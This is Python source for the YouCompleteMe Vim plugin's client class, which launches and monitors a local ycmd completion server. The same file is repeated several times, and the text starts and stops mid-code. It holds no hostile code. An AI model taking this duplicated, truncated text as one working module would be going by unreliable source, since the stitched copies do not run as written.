                                        error_output )
    else:
        vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR )


  def ServerPid( self ):
    if not self._server_popen:
      return -1
    return self._server_popen.pid


  def _ServerCleanup( self ):
    if self._IsServerAlive():
      self._server_popen.terminate()
    utils.RemoveIfExists( self._temp_options_filename )


  def RestartServer( self ):
    vimsupport.PostVimMessage( 'Restarting ycmd server...' )
    self._user_notified_about_crash = False
    self._ServerCleanup()
    self._SetupServer()


  def CreateCompletionRequest( self, force_semantic = False ):
    # We have to store a reference to the newly created CompletionRequest
    # because VimScript can't store a reference to a Python object across
    # function calls... Thus we need to keep this request somewhere.
    if ( not self.NativeFiletypeCompletionAvailable() and
         self.CurrentFiletypeCompletionEnabled() and
         self._omnicomp.ShouldUseNow() ):
      self._latest_completion_request = OmniCompletionRequest( self._omnicomp )
    else:
      extra_data = {}
      self._AddExtraConfDataIfNeeded( extra_data )
      if force_semantic:
        extra_data[ 'force_semantic' ] = True

      self._latest_completion_request = ( CompletionRequest( extra_data )
                                          if self._IsServerAlive() else
                                          None )
    return self._latest_completion_request


  def SendCommandRequest( self, arguments, completer ):
    if self._IsServerAlive():
      return SendCommandRequest( arguments, completer )


  def GetDefinedSubcommands( self ):
    if self._IsServerAlive():
      return BaseRequest.PostDataToHandler( BuildRequestData(),
                                            'defined_subcommands' )
    else:
      return []


  def GetCurrentCompletionRequest( self ):
    return self._latest_completion_request


  def GetOmniCompleter( self ):
    return self._omnicomp


  def NativeFiletypeCompletionAvailable( self ):
    return any( [ FiletypeCompleterExistsForFiletype( x ) for x in
                  vimsupport.CurrentFiletypes() ] )


  def NativeFiletypeCompletionUsable( self ):
    return ( self.CurrentFiletypeCompletionEnabled() and
             self.NativeFiletypeCompletionAvailable() )


  def OnFileReadyToParse( self ):
    self._omnicomp.OnFileReadyToParse( None )

    if not self._IsServerAlive():
      self._NotifyUserIfServerCrashed()

    extra_data = {}
    self._AddTagsFilesIfNeeded( extra_data )
    self._AddSyntaxDataIfNeeded( extra_data )
    self._AddExtraConfDataIfNeeded( extra_data )

    self._latest_file_parse_request = EventNotification( 'FileReadyToParse',
                                                          extra_data )
    self._latest_file_parse_request.Start()


  def OnBufferUnload( self, deleted_buffer_file ):
    if not self._IsServerAlive():
      return
    SendEventNotificationAsync( 'BufferUnload',
                                { 'unloaded_buffer': deleted_buffer_file } )


  def OnBufferVisit( self ):
    if not self._IsServerAlive():
      return
    extra_data = {}
    _AddUltiSnipsDataIfNeeded( extra_data )
    SendEventNotificationAsync( 'BufferVisit', extra_data )


  def OnInsertLeave( self ):
    if not self._IsServerAlive():
      return
    SendEventNotificationAsync( 'InsertLeave' )


  def OnCursorMoved( self ):
    self._diag_interface.OnCursorMoved()


  def OnVimLeave( self ):
    self._ServerCleanup()


  def OnCurrentIdentifierFinished( self ):
    if not self._IsServerAlive():
      return
    SendEventNotificationAsync( 'CurrentIdentifierFinished' )


  def DiagnosticsForCurrentFileReady( self ):
    return bool( self._latest_file_parse_request and
                 self._latest_file_parse_request.Done() )


  def GetDiagnosticsFromStoredRequest( self, qflist_format = False ):
    if self.DiagnosticsForCurrentFileReady():
      diagnostics = self._latest_file_parse_request.Response()
      # We set the diagnostics request to None because we want to prevent
      # Syntastic from repeatedly refreshing the buffer with the same diags.
      # Setting this to None makes DiagnosticsForCurrentFileReady return False
      # until the next request is created.
      self._latest_file_parse_request = None
      if qflist_format:
        return vimsupport.ConvertDiagnosticsToQfList( diagnostics )
      else:
        return diagnostics
    return []


  def UpdateDiagnosticInterface( self ):
    if not self.DiagnosticsForCurrentFileReady():
      return
    self._diag_interface.UpdateWithNewDiagnostics(
      self.GetDiagnosticsFromStoredRequest() )


  def ShowDetailedDiagnostic( self ):
    if not self._IsServerAlive():
      return
    try:
      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),
                                                  'detailed_diagnostic' )
      if 'message' in debug_info:
        vimsupport.EchoText( debug_info[ 'message' ] )
    except ServerError as e:
      vimsupport.PostVimMessage( str( e ) )


  def DebugInfo( self ):
    if self._IsServerAlive():
      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),
                                                  'debug_info' )
    else:
      debug_info = 'Server crashed, no debug info from server'
    debug_info += '\nServer running at: {0}'.format(
        BaseRequest.server_location )
    debug_info += '\nServer process ID: {0}'.format( self._server_popen.pid )
    if self._server_stderr or self._server_stdout:
      debug_info += '\nServer logfiles:\n  {0}\n  {1}'.format(
        self._server_stdout,
        self._server_stderr )

    return debug_info


  def CurrentFiletypeCompletionEnabled( self ):
    filetypes = vimsupport.CurrentFiletypes()
    filetype_to_disable = self._user_options[
      'filetype_specific_completion_to_disable' ]
    return not all([ x in filetype_to_disable for x in filetypes ])


  def _AddSyntaxDataIfNeeded( self, extra_data ):
    if not self._user_options[ 'seed_identifiers_with_syntax' ]:
      return
    filetype = vimsupport.CurrentFiletypes()[ 0 ]
    if filetype in self._filetypes_with_keywords_loaded:
      return

    self._filetypes_with_keywords_loaded.add( filetype )
    extra_data[ 'syntax_keywords' ] = list(
       syntax_parse.SyntaxKeywordsForCurrentBuffer() )


  def _AddTagsFilesIfNeeded( self, extra_data ):
    def GetTagFiles():
      tag_files = vim.eval( 'tagfiles()' )
      current_working_directory = os.getcwd()
      return [ os.path.join( current_working_directory, x ) for x in tag_files ]

    if not self._user_options[ 'collect_identifiers_from_tags_files' ]:
      return
    extra_data[ 'tag_files' ] = GetTagFiles()


  def _AddExtraConfDataIfNeeded( self, extra_data ):
    def BuildExtraConfData( extra_conf_vim_data ):
      return dict( ( expr, vimsupport.VimExpressionToPythonType( expr ) )
                   for expr in extra_conf_vim_data )

    extra_conf_vim_data = self._user_options[ 'extra_conf_vim_data' ]
    if extra_conf_vim_data:
      extra_data[ 'extra_conf_data' ] = BuildExtraConfData(
        extra_conf_vim_data )


def _PathToServerScript():
  dir_of_current_script = os.path.dirname( os.path.abspath( __file__ ) )
  return os.path.join( dir_of_current_script, 'server/ycmd.py' )


def _AddUltiSnipsDataIfNeeded( extra_data ):
  if not USE_ULTISNIPS_DATA:
    return

  try:
    rawsnips = UltiSnips_Manager._snips( '', 1 )
  except:
    return

  # UltiSnips_Manager._snips() returns a class instance where:
  # class.trigger - name of snippet trigger word ( e.g. defn or testcase )
  # class.description - description of the snippet
  extra_data[ 'ultisnips_snippets' ] = [ { 'trigger': x.trigger,
                                           'description': x.description
                                         } for x in rawsnips ]




#!/usr/bin/env python
#
# Copyright (C) 2011, 2012  Google Inc.
#
# This file is part of YouCompleteMe.
#
# YouCompleteMe is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# YouCompleteMe is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.

import os
import vim
import tempfile
import json
import signal
from subprocess import PIPE
from ycm import vimsupport
from ycm import utils
from ycm.diagnostic_interface import DiagnosticInterface
from ycm.completers.all.omni_completer import OmniCompleter
from ycm.completers.general import syntax_parse
from ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype
from ycm.client.ycmd_keepalive import YcmdKeepalive
from ycm.client.base_request import BaseRequest, BuildRequestData
from ycm.client.command_request import SendCommandRequest
from ycm.client.completion_request import CompletionRequest
from ycm.client.omni_completion_request import OmniCompletionRequest
from ycm.client.event_notification import ( SendEventNotificationAsync,
                                            EventNotification )
from ycm.server.responses import ServerError

try:
  from UltiSnips import UltiSnips_Manager
  USE_ULTISNIPS_DATA = True
except ImportError:
  USE_ULTISNIPS_DATA = False

# We need this so that Requests doesn't end up using the local HTTP proxy when
# talking to ycmd. Users should actually be setting this themselves when
# configuring a proxy server on their machine, but most don't know they need to
# or how to do it, so we do it for them.
# Relevant issues:
#  https://github.com/Valloric/YouCompleteMe/issues/641
#  https://github.com/kennethreitz/requests/issues/879
os.environ['no_proxy'] = '127.0.0.1,localhost'

# Force the Python interpreter embedded in Vim (in which we are running) to
# ignore the SIGINT signal. This helps reduce the fallout of a user pressing
# Ctrl-C in Vim.
signal.signal( signal.SIGINT, signal.SIG_IGN )

NUM_YCMD_STDERR_LINES_ON_CRASH = 30
SERVER_CRASH_MESSAGE_STDERR_FILE = (
  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +
  'Stderr (last {0} lines):\n\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH ) )
SERVER_CRASH_MESSAGE_SAME_STDERR = (
  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). '
  ' check console output for logs!' )
SERVER_IDLE_SUICIDE_SECONDS = 10800  # 3 hours


class YouCompleteMe( object ):
  def __init__( self, user_options ):
    self._user_options = user_options
    self._user_notified_about_crash = False
    self._diag_interface = DiagnosticInterface( user_options )
    self._omnicomp = OmniCompleter( user_options )
    self._latest_completion_request = None
    self._latest_file_parse_request = None
    self._server_stdout = None
    self._server_stderr = None
    self._server_popen = None
    self._filetypes_with_keywords_loaded = set()
    self._temp_options_filename = None                    
    self._ycmd_keepalive = YcmdKeepalive()
    self._SetupServer()
    self._ycmd_keepalive.Start()

  def _SetupServer( self ):
    server_port = utils.GetUnusedLocalhostPort()
    with tempfile.NamedTemporaryFile( delete = False ) as options_file:
      self._temp_options_filename = options_file.name                    
      json.dump( dict( self._user_options ), options_file )
      options_file.flush()

      args = [ utils.PathToPythonInterpreter(),
               _PathToServerScript(),
               '--port={0}'.format( server_port ),
               '--options_file={0}'.format( options_file.name ),
               '--log={0}'.format( self._user_options[ 'server_log_level' ] ),
               '--idle_suicide_seconds={0}'.format(
                  SERVER_IDLE_SUICIDE_SECONDS )]

      if not self._user_options[ 'server_use_vim_stdout' ]:
        filename_format = os.path.join( utils.PathToTempDir(),
                                        'server_{port}_{std}.log' )

        self._server_stdout = filename_format.format( port = server_port,
                                                      std = 'stdout' )
        self._server_stderr = filename_format.format( port = server_port,
                                                      std = 'stderr' )
        args.append('--stdout={0}'.format( self._server_stdout ))
        args.append('--stderr={0}'.format( self._server_stderr ))

        if self._user_options[ 'server_keep_logfiles' ]:
          args.append('--keep_logfiles')

      self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)
      BaseRequest.server_location = 'http://localhost:' + str( server_port )

    self._NotifyUserIfServerCrashed()

  def _IsServerAlive( self ):
    returncode = self._server_popen.poll()
    # When the process hasn't finished yet, poll() returns None.
    return returncode is None


  def _NotifyUserIfServerCrashed( self ):
    if self._user_notified_about_crash or self._IsServerAlive():
      return
    self._user_notified_about_crash = True
    if self._server_stderr:
      with open( self._server_stderr, 'r' ) as server_stderr_file:
        error_output = ''.join( server_stderr_file.readlines()[
            : - NUM_YCMD_STDERR_LINES_ON_CRASH ] )
        vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE +
                                        error_output )
    else:
        vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR )


  def ServerPid( self ):
    if not self._server_popen:
      return -1
    return self._server_popen.pid


  def _ServerCleanup( self ):
    if self._IsServerAlive():
      self._server_popen.terminate()
    utils.RemoveIfExists( self._temp_options_filename )


  def RestartServer( self ):
    vimsupport.PostVimMessage( 'Restarting ycmd server...' )
    self._user_notified_about_crash = False
    self._ServerCleanup()
    self._SetupServer()


  def CreateCompletionRequest( self, force_semantic = False ):
    # We have to store a reference to the newly created CompletionRequest
    # because VimScript can't store a reference to a Python object across
    # function calls... Thus we need to keep this request somewhere.
    if ( not self.NativeFiletypeCompletionAvailable() and
         self.CurrentFiletypeCompletionEnabled() and
         self._omnicomp.ShouldUseNow() ):
      self._latest_completion_request = OmniCompletionRequest( self._omnicomp )
    else:
      extra_data = {}
      self._AddExtraConfDataIfNeeded( extra_data )
      if force_semantic:
        extra_data[ 'force_semantic' ] = True

      self._latest_completion_request = ( CompletionRequest( extra_data )
                                          if self._IsServerAlive() else
                                          None )
    return self._latest_completion_request


  def SendCommandRequest( self, arguments, completer ):
    if self._IsServerAlive():
      return SendCommandRequest( arguments, completer )


  def GetDefinedSubcommands( self ):
    if self._IsServerAlive():
      return BaseRequest.PostDataToHandler( BuildRequestData(),
                                            'defined_subcommands' )
    else:
      return []


  def GetCurrentCompletionRequest( self ):
    return self._latest_completion_request


  def GetOmniCompleter( self ):
    return self._omnicomp


  def NativeFiletypeCompletionAvailable( self ):
    return any( [ FiletypeCompleterExistsForFiletype( x ) for x in
                  vimsupport.CurrentFiletypes() ] )


  def NativeFiletypeCompletionUsable( self ):
    return ( self.CurrentFiletypeCompletionEnabled() and
             self.NativeFiletypeCompletionAvailable() )


  def OnFileReadyToParse( self ):
    self._omnicomp.OnFileReadyToParse( None )

    if not self._IsServerAlive():
      self._NotifyUserIfServerCrashed()

    extra_data = {}
    self._AddTagsFilesIfNeeded( extra_data )
    self._AddSyntaxDataIfNeeded( extra_data )
    self._AddExtraConfDataIfNeeded( extra_data )

    self._latest_file_parse_request = EventNotification( 'FileReadyToParse',
                                                          extra_data )
    self._latest_file_parse_request.Start()


  def OnBufferUnload( self, deleted_buffer_file ):
    if not self._IsServerAlive():
      return
    SendEventNotificationAsync( 'BufferUnload',
                                { 'unloaded_buffer': deleted_buffer_file } )


  def OnBufferVisit( self ):
    if not self._IsServerAlive():
      return
    extra_data = {}
    _AddUltiSnipsDataIfNeeded( extra_data )
    SendEventNotificationAsync( 'BufferVisit', extra_data )


  def OnInsertLeave( self ):
    if not self._IsServerAlive():
      return
    SendEventNotificationAsync( 'InsertLeave' )


  def OnCursorMoved( self ):
    self._diag_interface.OnCursorMoved()


  def OnVimLeave( self ):
    self._ServerCleanup()


  def OnCurrentIdentifierFinished( self ):
    if not self._IsServerAlive():
      return
    SendEventNotificationAsync( 'CurrentIdentifierFinished' )


  def DiagnosticsForCurrentFileReady( self ):
    return bool( self._latest_file_parse_request and
                 self._latest_file_parse_request.Done() )


  def GetDiagnosticsFromStoredRequest( self, qflist_format = False ):
    if self.DiagnosticsForCurrentFileReady():
      diagnostics = self._latest_file_parse_request.Response()
      # We set the diagnostics request to None because we want to prevent
      # Syntastic from repeatedly refreshing the buffer with the same diags.
      # Setting this to None makes DiagnosticsForCurrentFileReady return False
      # until the next request is created.
      self._latest_file_parse_request = None
      if qflist_format:
        return vimsupport.ConvertDiagnosticsToQfList( diagnostics )
      else:
        return diagnostics
    return []


  def UpdateDiagnosticInterface( self ):
    if not self.DiagnosticsForCurrentFileReady():
      return
    self._diag_interface.UpdateWithNewDiagnostics(
      self.GetDiagnosticsFromStoredRequest() )


  def ShowDetailedDiagnostic( self ):
    if not self._IsServerAlive():
      return
    try:
      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),
                                                  'detailed_diagnostic' )
      if 'message' in debug_info:
        vimsupport.EchoText( debug_info[ 'message' ] )
    except ServerError as e:
      vimsupport.PostVimMessage( str( e ) )


  def DebugInfo( self ):
    if self._IsServerAlive():
      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),
                                                  'debug_info' )
    else:
      debug_info = 'Server crashed, no debug info from server'
    debug_info += '\nServer running at: {0}'.format(
        BaseRequest.server_location )
    debug_info += '\nServer process ID: {0}'.format( self._server_popen.pid )
    if self._server_stderr or self._server_stdout:
      debug_info += '\nServer logfiles:\n  {0}\n  {1}'.format(
        self._server_stdout,
        self._server_stderr )

    return debug_info


  def CurrentFiletypeCompletionEnabled( self ):
    filetypes = vimsupport.CurrentFiletypes()
    filetype_to_disable = self._user_options[
      'filetype_specific_completion_to_disable' ]
    return not all([ x in filetype_to_disable for x in filetypes ])


  def _AddSyntaxDataIfNeeded( self, extra_data ):
    if not self._user_options[ 'seed_identifiers_with_syntax' ]:
      return
    filetype = vimsupport.CurrentFiletypes()[ 0 ]
    if filetype in self._filetypes_with_keywords_loaded:
      return

    self._filetypes_with_keywords_loaded.add( filetype )
    extra_data[ 'syntax_keywords' ] = list(
       syntax_parse.SyntaxKeywordsForCurrentBuffer() )


  def _AddTagsFilesIfNeeded( self, extra_data ):
    def GetTagFiles():
      tag_files = vim.eval( 'tagfiles()' )
      current_working_directory = os.getcwd()
      return [ os.path.join( current_working_directory, x ) for x in tag_files ]

    if not self._user_options[ 'collect_identifiers_from_tags_files' ]:
      return
    extra_data[ 'tag_files' ] = GetTagFiles()


  def _AddExtraConfDataIfNeeded( self, extra_data ):
    def BuildExtraConfData( extra_conf_vim_data ):
      return dict( ( expr, vimsupport.VimExpressionToPythonType( expr ) )
                   for expr in extra_conf_vim_data )

    extra_conf_vim_data = self._user_options[ 'extra_conf_vim_data' ]
    if extra_conf_vim_data:
      extra_data[ 'extra_conf_data' ] = BuildExtraConfData(
        extra_conf_vim_data )


def _PathToServerScript():
  dir_of_current_script = os.path.dirname( os.path.abspath( __file__ ) )
  return os.path.join( dir_of_current_script, 'server/ycmd.py' )


def _AddUltiSnipsDataIfNeeded( extra_data ):
  if not USE_ULTISNIPS_DATA:
    return

  try:
    rawsnips = UltiSnips_Manager._snips( '', 1 )
  except:
    return

  # UltiSnips_Manager._snips() returns a class instance where:
  # class.trigger - name of snippet trigger word ( e.g. defn or testcase )
  # class.description - description of the snippet
  extra_data[ 'ultisnips_snippets' ] = [ { 'trigger': x.trigger,
                                           'description': x.description
                                         } for x in rawsnips ]




#!/usr/bin/env python
#
# Copyright (C) 2011, 2012  Google Inc.
#
# This file is part of YouCompleteMe.
#
# YouCompleteMe is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# YouCompleteMe is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.

import os
import vim
import tempfile
import json
import signal
from subprocess import PIPE
from ycm import vimsupport
from ycm import utils
from ycm.diagnostic_interface import DiagnosticInterface
from ycm.completers.all.omni_completer import OmniCompleter
from ycm.completers.general import syntax_parse
from ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype
from ycm.client.ycmd_keepalive import YcmdKeepalive
from ycm.client.base_request import BaseRequest, BuildRequestData
from ycm.client.command_request import SendCommandRequest
from ycm.client.completion_request import CompletionRequest
from ycm.client.omni_completion_request import OmniCompletionRequest
from ycm.client.event_notification import ( SendEventNotificationAsync,
                                            EventNotification )
from ycm.server.responses import ServerError

try:
  from UltiSnips import UltiSnips_Manager
  USE_ULTISNIPS_DATA = True
except ImportError:
  USE_ULTISNIPS_DATA = False

# We need this so that Requests doesn't end up using the local HTTP proxy when
# talking to ycmd. Users should actually be setting this themselves when
# configuring a proxy server on their machine, but most don't know they need to
# or how to do it, so we do it for them.
# Relevant issues:
#  https://github.com/Valloric/YouCompleteMe/issues/641
#  https://github.com/kennethreitz/requests/issues/879
os.environ['no_proxy'] = '127.0.0.1,localhost'

# Force the Python interpreter embedded in Vim (in which we are running) to
# ignore the SIGINT signal. This helps reduce the fallout of a user pressing
# Ctrl-C in Vim.
signal.signal( signal.SIGINT, signal.SIG_IGN )

NUM_YCMD_STDERR_LINES_ON_CRASH = 30
SERVER_CRASH_MESSAGE_STDERR_FILE = (
  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +
  'Stderr (last {0} lines):\n\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH ) )
SERVER_CRASH_MESSAGE_SAME_STDERR = (
  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). '
  ' check console output for logs!' )
SERVER_IDLE_SUICIDE_SECONDS = 10800  # 3 hours


class YouCompleteMe( object ):
  def __init__( self, user_options ):
    self._user_options = user_options
    self._user_notified_about_crash = False
    self._diag_interface = DiagnosticInterface( user_options )
    self._omnicomp = OmniCompleter( user_options )
    self._latest_completion_request = None
    self._latest_file_parse_request = None
    self._server_stdout = None
    self._server_stderr = None
    self._server_popen = None
    self._filetypes_with_keywords_loaded = set()
    self._temp_options_filename = None                    
    self._ycmd_keepalive = YcmdKeepalive()
    self._SetupServer()
    self._ycmd_keepalive.Start()

  def _SetupServer( self ):
    server_port = utils.GetUnusedLocalhostPort()
    with tempfile.NamedTemporaryFile( delete = False ) as options_file:
      self._temp_options_filename = options_file.name                    
      json.dump( dict( self._user_options ), options_file )
      options_file.flush()

      args = [ utils.PathToPythonInterpreter(),
               _PathToServerScript(),
               '--port={0}'.format( server_port ),
               '--options_file={0}'.format( options_file.name ),
               '--log={0}'.format( self._user_options[ 'server_log_level' ] ),
               '--idle_suicide_seconds={0}'.format(
                  SERVER_IDLE_SUICIDE_SECONDS )]

      if not self._user_options[ 'server_use_vim_stdout' ]:
        filename_format = os.path.join( utils.PathToTempDir(),
                                        'server_{port}_{std}.log' )

        self._server_stdout = filename_format.format( port = server_port,
                                                      std = 'stdout' )
        self._server_stderr = filename_format.format( port = server_port,
                                                      std = 'stderr' )
        args.append('--stdout={0}'.format( self._server_stdout ))
        args.append('--stderr={0}'.format( self._server_stderr ))

        if self._user_options[ 'server_keep_logfiles' ]:
          args.append('--keep_logfiles')

      self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)
      BaseRequest.server_location = 'http://localhost:' + str( server_port )

    self._NotifyUserIfServerCrashed()

  def _IsServerAlive( self ):
    returncode = self._server_popen.poll()
    # When the process hasn't finished yet, poll() returns None.
    return returncode is None


  def _NotifyUserIfServerCrashed( self ):
    if self._user_notified_about_crash or self._IsServerAlive():
      return
    self._user_notified_about_crash = True
    if self._server_stderr:
      with open( self._server_stderr, 'r' ) as server_stderr_file:
        error_output = ''.join( server_stderr_file.readlines()[
            : - NUM_YCMD_STDERR_LINES_ON_CRASH ] )
        vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE +
                                        error_output )
    else:
        vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR )


  def ServerPid( self ):
    if not self._server_popen:
      return -1
    return self._server_popen.pid


  def _ServerCleanup( self ):
    if self._IsServerAlive():
      self._server_popen.terminate()
    utils.RemoveIfExists( self._temp_options_filename )


  def RestartServer( self ):
    vimsupport.PostVimMessage( 'Restarting ycmd server...' )
    self._user_notified_about_crash = False
    self._ServerCleanup()
    self._SetupServer()


  def CreateCompletionRequest( self, force_semantic = False ):
    # We have to store a reference to the newly created CompletionRequest
    # because VimScript can't store a reference to a Python object across
    # function calls... Thus we need to keep this request somewhere.
    if ( not self.NativeFiletypeCompletionAvailable() and
         self.CurrentFiletypeCompletionEnabled() and
         self._omnicomp.ShouldUseNow() ):
      self._latest_completion_request = OmniCompletionRequest( self._omnicomp )
    else:
      extra_data = {}
      self._AddExtraConfDataIfNeeded( extra_data )
      if force_semantic:
        extra_data[ 'force_semantic' ] = True

      self._latest_completion_request = ( CompletionRequest( extra_data )
                                          if self._IsServerAlive() else
                                          None )
    return self._latest_completion_request


  def SendCommandRequest( self, arguments, completer ):
    if self._IsServerAlive():
      return SendCommandRequest( arguments, completer )


  def GetDefinedSubcommands( self ):
    if self._IsServerAlive():
      return BaseRequest.PostDataToHandler( BuildRequestData(),
                                            'defined_subcommands' )
    else:
      return []


  def GetCurrentCompletionRequest( self ):
    return self._latest_completion_request


  def GetOmniCompleter( self ):
    return self._omnicomp


  def NativeFiletypeCompletionAvailable( self ):
    return any( [ FiletypeCompleterExistsForFiletype( x ) for x in
                  vimsupport.CurrentFiletypes() ] )


  def NativeFiletypeCompletionUsable( self ):
    return ( self.CurrentFiletypeCompletionEnabled() and
             self.NativeFiletypeCompletionAvailable() )


  def OnFileReadyToParse( self ):
    self._omnicomp.OnFileReadyToParse( None )

    if not self._IsServerAlive():
      self._NotifyUserIfServerCrashed()

    extra_data = {}
    self._AddTagsFilesIfNeeded( extra_data )
    self._AddSyntaxDataIfNeeded( extra_data )
    self._AddExtraConfDataIfNeeded( extra_data )

    self._latest_file_parse_request = EventNotification( 'FileReadyToParse',
                                                          extra_data )
    self._latest_file_parse_request.Start()


  def OnBufferUnload( self, deleted_buffer_file ):
    if not self._IsServerAlive():
      return
    SendEventNotificationAsync( 'BufferUnload',
                                { 'unloaded_buffer': deleted_buffer_file } )


  def OnBufferVisit( self ):
    if not self._IsServerAlive():
      return
    extra_data = {}
    _AddUltiSnipsDataIfNeeded( extra_data )
    SendEventNotificationAsync( 'BufferVisit', extra_data )


  def OnInsertLeave( self ):
    if not self._IsServerAlive():
      return
    SendEventNotificationAsync( 'InsertLeave' )


  def OnCursorMoved( self ):
    self._diag_interface.OnCursorMoved()


  def OnVimLeave( self ):
    self._ServerCleanup()


  def OnCurrentIdentifierFinished( self ):
    if not self._IsServerAlive():
      return
    SendEventNotificationAsync( 'CurrentIdentifierFinished' )


  def DiagnosticsForCurrentFileReady( self ):
    return bool( self._latest_file_parse_request and
                 self._latest_file_parse_request.Done() )


  def GetDiagnosticsFromStoredRequest( self, qflist_format = False ):
    if self.DiagnosticsForCurrentFileReady():
      diagnostics = self._latest_file_parse_request.Response()
      # We set the diagnostics request to None because we want to prevent
      # Syntastic from repeatedly refreshing the buffer with the same diags.
      # Setting this to None makes DiagnosticsForCurrentFileReady return False
      # until the next request is created.
      self._latest_file_parse_request = None
      if qflist_format:
        return vimsupport.ConvertDiagnosticsToQfList( diagnostics )
      else:
        return diagnostics
    return []


  def UpdateDiagnosticInterface( self ):
    if not self.DiagnosticsForCurrentFileReady():
      return
    self._diag_interface.UpdateWithNewDiagnostics(
      self.GetDiagnosticsFromStoredRequest() )


  def ShowDetailedDiagnostic( self ):
    if not self._IsServerAlive():
      return
    try:
      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),
                                                  'detailed_diagnostic' )
      if 'message' in debug_info:
        vimsupport.EchoText( debug_info[ 'message' ] )
    except ServerError as e:
      vimsupport.PostVimMessage( str( e ) )


  def DebugInfo( self ):
    if self._IsServerAlive():
      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),
                                                  'debug_info' )
    else:
      debug_info = 'Server crashed, no debug info from server'
    debug_info += '\nServer running at: {0}'.format(
        BaseRequest.server_location )
    debug_info += '\nServer process ID: {0}'.format( self._server_popen.pid )
    if self._server_stderr or self._server_stdout:
      debug_info += '\nServer logfiles:\n  {0}\n  {1}'.format(
        self._server_stdout,
        self._server_stderr )

    return debug_info


  def CurrentFiletypeCompletionEnabled( self ):
    filetypes = vimsupport.CurrentFiletypes()
    filetype_to_disable = self._user_options[
      'filetype_specific_completion_to_disable' ]
    return not all([ x in filetype_to_disable for x in filetypes ])


  def _AddSyntaxDataIfNeeded( self, extra_data ):
    if not self._user_options[ 'seed_identifiers_with_syntax' ]:
      return
    filetype = vimsupport.CurrentFiletypes()[ 0 ]
    if filetype in self._filetypes_with_keywords_loaded:
      return

    self._filetypes_with_keywords_loaded.add( filetype )
    extra_data[ 'syntax_keywords' ] = list(
       syntax_parse.SyntaxKeywordsForCurrentBuffer() )


  def _AddTagsFilesIfNeeded( self, extra_data ):
    def GetTagFiles():
      tag_files = vim.eval( 'tagfiles()' )
      current_working_directory = os.getcwd()
      return [ os.path.join( current_working_directory, x ) for x in tag_files ]

    if not self._user_options[ 'collect_identifiers_from_tags_files' ]:
      return
    extra_data[ 'tag_files' ] = GetTagFiles()


  def _AddExtraConfDataIfNeeded( self, extra_data ):
    def BuildExtraConfData( extra_conf_vim_data ):
      return dict( ( expr, vimsupport.VimExpressionToPythonType( expr ) )
                   for expr in extra_conf_vim_data )

    extra_conf_vim_data = self._user_options[ 'extra_conf_vim_data' ]
    if extra_conf_vim_data:
      extra_data[ 'extra_conf_data' ] = BuildExtraConfData(
        extra_conf_vim_data )


def _PathToServerScript():
  dir_of_current_script = os.path.dirname( os.path.abspath( __file__ ) )
  return os.path.join( dir_of_current_script, 'server/ycmd.py' )


def _AddUltiSnipsDataIfNeeded( extra_data ):
  if not USE_ULTISNIPS_DATA:
    return

  try:
    rawsnips = UltiSnips_Manager._snips( '', 1 )
  except:
    return

  # UltiSnips_Manager._snips() returns a class instance where:
  # class.trigger - name of snippet trigger word ( e.g. defn or testcase )
  # class.description - description of the snippet
  extra_data[ 'ultisnips_snippets' ] = [ { 'trigger': x.trigger,
                                           'description': x.description
                                         } for x in rawsnips ]




#!/usr/bin/env python
#
# Copyright (C) 2011, 2012  Google Inc.
#
# This file is part of YouCompleteMe.
#
# YouCompleteMe is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# YouCompleteMe is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.

import os
import vim
import tempfile
import json
import signal
from subprocess import PIPE
from ycm import vimsupport
from ycm import utils
from ycm.diagnostic_interface import DiagnosticInterface
from ycm.completers.all.omni_completer import OmniCompleter
from ycm.completers.general import syntax_parse
from ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype
from ycm.client.ycmd_keepalive import YcmdKeepalive
from ycm.client.base_request import BaseRequest, BuildRequestData
from ycm.client.command_request import SendCommandRequest
from ycm.client.completion_request import CompletionRequest
from ycm.client.omni_completion_request import OmniCompletionRequest
from ycm.client.event_notification import ( SendEventNotificationAsync,
                                            EventNotification )
from ycm.server.responses import ServerError

try:
  from UltiSnips import UltiSnips_Manager
  USE_ULTISNIPS_DATA = True
except ImportError:
